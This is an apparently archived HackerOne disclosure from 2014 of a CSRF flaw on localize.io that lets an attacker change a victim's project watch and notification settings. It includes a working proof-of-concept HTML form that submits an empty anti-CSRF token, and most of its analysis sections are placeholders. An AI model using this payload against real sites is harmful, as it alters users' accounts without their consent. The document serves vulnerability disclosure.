# Projects Watch or Notifications Settings Change Via CSRF

## Metadata
- **Source:** HackerOne
- **Report:** 8273 | https://hackerone.com/reports/8273
- **Submitted:** 2014-04-21
- **Reporter:** ajaysinghnegi
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Hi Team,

I have found a CSRF vulnerability using which the attacker can force the victim to chnage the settings for Projects Watch or Notifications Via CSRF as the anti-csrf token is not getting validated on the server-side.

Projects Watch or Notifications Settings Change Via CSRF Code:

<html>
  <body>
    <form action="http://www.localize.io/watch/9s" method="POST">
      <input type=

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi Team,

I have found a CSRF vulnerability using which the attacker can force the victim to chnage the settings for Projects Watch or Notifications Via CSRF as the anti-csrf token is not getting validated on the server-side.

Projects Watch or Notifications Settings Change Via CSRF Code:

<html>
  <body>
    <form action="http://www.localize.io/watch/9s" method="POST">
      <input type="hidden" name="CSRFToken" value="" />
      <input type="hidden" name="watch[events][1]" value="0" />
      <input type="hidden" name="watch[events][2]" value="0" />
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>


</details>

---
*Analysed by Claude on 2026-05-24*
